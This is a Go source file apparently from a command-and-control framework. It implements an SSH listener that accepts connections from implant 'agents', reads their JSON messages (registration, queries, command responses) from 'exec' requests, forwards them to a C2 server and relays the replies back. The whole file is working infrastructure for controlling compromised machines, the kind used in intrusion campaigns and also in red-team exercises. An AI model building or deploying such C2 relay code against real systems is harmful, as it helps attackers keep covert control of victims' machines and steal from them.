package accept

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

// SSHHandler handles reverse SSH connections for secure C2
type SSHHandler struct {
	*BaseHandler
	listener  net.Listener
	sshConfig *ssh.ServerConfig
}

// NewSSHHandler creates a new SSH handler
func NewSSHHandler(sendToC2 SendToC2Func, logger *log.Logger, config *HandlerConfig, sshConfig *ssh.ServerConfig) *SSHHandler {
	return &SSHHandler{
		BaseHandler: NewBaseHandler(sendToC2, logger, config, "ssh"),
		sshConfig:   sshConfig,
	}
}

// Start begins listening for SSH connections
func (h *SSHHandler) Start(ctx context.Context, addr string) error {
	h.logger.Printf("[%s:%s] Starting SSH listener on %s", h.ProtocolName(), h.AgentType(), addr)

	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to start SSH listener: %v", err)
	}
	h.listener = listener

	// Accept connections in background
	go h.acceptConnections(ctx)

	// Wait for context cancellation
	<-ctx.Done()
	h.logger.Printf("[%s:%s] Shutting down SSH listener", h.ProtocolName(), h.AgentType())
	return h.listener.Close()
}

// Stop gracefully stops the handler
func (h *SSHHandler) Stop() error {
	if h.listener != nil {
		return h.listener.Close()
	}
	return nil
}

// acceptConnections accepts and handles SSH connections
func (h *SSHHandler) acceptConnections(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := h.listener.Accept()
			if err != nil {
				if ctx.Err() != nil {
					return
				}
				h.logger.Printf("[%s:%s] Accept error: %v", h.ProtocolName(), h.AgentType(), err)
				continue
			}

			go h.handleSSHConnection(ctx, conn)
		}
	}
}

// handleSSHConnection handles a single SSH connection
func (h *SSHHandler) handleSSHConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	// Set connection deadline to prevent hanging connections (5 minute idle timeout)
	// This will be updated on activity in a real implementation
	conn.SetDeadline(time.Now().Add(5 * time.Minute))

	// Monitor context and force close connection on cancellation
	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	// Perform SSH handshake
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, h.sshConfig)
	if err != nil {
		h.logger.Printf("[%s:%s] SSH handshake failed: %v", h.ProtocolName(), h.AgentType(), err)
		return
	}
	defer sshConn.Close()

	h.logger.Printf("[%s:%s] SSH connection established from %s (user: %s)",
		h.ProtocolName(), h.AgentType(), conn.RemoteAddr(), sshConn.User())

	// Discard global requests
	go ssh.DiscardRequests(reqs)

	// Handle channels (sessions) with context monitoring
	go func() {
		<-ctx.Done()
		// Force close the connection when context is cancelled
		sshConn.Close()
	}()

	for newChannel := range chans {
		// Check context before accepting new channels
		select {
		case <-ctx.Done():
			return
		default:
		}

		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			h.logger.Printf("[%s:%s] Channel accept error: %v", h.ProtocolName(), h.AgentType(), err)
			continue
		}

		go h.handleSSHSession(ctx, channel, requests)
	}
}

// handleSSHSession handles an SSH session channel
func (h *SSHHandler) handleSSHSession(ctx context.Context, channel ssh.Channel, requests <-chan *ssh.Request) {
	defer channel.Close()

	// Monitor context and force close channel on cancellation
	go func() {
		<-ctx.Done()
		channel.Close()
	}()

	for req := range requests {
		// Check context before processing requests
		select {
		case <-ctx.Done():
			return
		default:
		}

		switch req.Type {
		case "exec":
			// Agent is sending a message (registration, GraphQL query, command response)
			go h.handleExecRequest(ctx, channel, req)

		case "shell", "pty-req":
			// Reject interactive requests
			if req.WantReply {
				req.Reply(false, nil)
			}

		default:
			if req.WantReply {
				req.Reply(false, nil)
			}
		}
	}
}

// handleExecRequest handles "exec" requests (our C2 protocol over SSH)
func (h *SSHHandler) handleExecRequest(ctx context.Context, channel ssh.Channel, req *ssh.Request) {
	if req.WantReply {
		req.Reply(true, nil)
	}

	// Read the command/message from stdin (channel input)
	// Agent sends JSON via session.Stdin
	message, err := io.ReadAll(channel)
	if err != nil {
		h.logger.Printf("[%s:%s] Failed to read message: %v", h.ProtocolName(), h.AgentType(), err)
		channel.Write([]byte(fmt.Sprintf(`{"error": "failed to read: %v"}`, err)))
		return
	}

	// Parse the message to extract the endpoint
	var payload map[string]interface{}
	if err := json.Unmarshal(message, &payload); err != nil {
		h.logger.Printf("[%s:%s] Failed to parse message: %v", h.ProtocolName(), h.AgentType(), err)
		channel.Write([]byte(fmt.Sprintf(`{"error": "invalid JSON: %v"}`, err)))
		return
	}

	// Extract the endpoint from the payload (default to /wiki if not present for backwards compatibility)
	endpoint := "/wiki"
	if ep, ok := payload["endpoint"].(string); ok && ep != "" {
		endpoint = ep
	}

	// Create minimal headers - Content-Type only (agent type now in body)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/json"

	// Forward to C2
	resp, err := h.sendToC2(ctx, endpoint, headers, message)
	if err != nil {
		h.logger.Printf("[%s:%s] Failed to forward to C2: %v", h.ProtocolName(), h.AgentType(), err)
		channel.Write([]byte(fmt.Sprintf(`{"error": "%s"}`, err.Error())))
		channel.Close()
		return
	}

	// Read C2 response
	respBody, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		h.logger.Printf("[%s:%s] Failed to read C2 response: %v", h.ProtocolName(), h.AgentType(), err)
		channel.Close()
		return
	}

	// Send response back to agent via SSH channel
	h.logger.Printf("[%s:%s] Sending %d bytes response back", h.ProtocolName(), h.AgentType(), len(respBody))
	channel.Write(respBody)

	// Close the channel to signal completion (this allows CombinedOutput to return)
	channel.Close()
	h.logger.Printf("[%s:%s] Channel closed, session complete", h.ProtocolName(), h.AgentType())
}
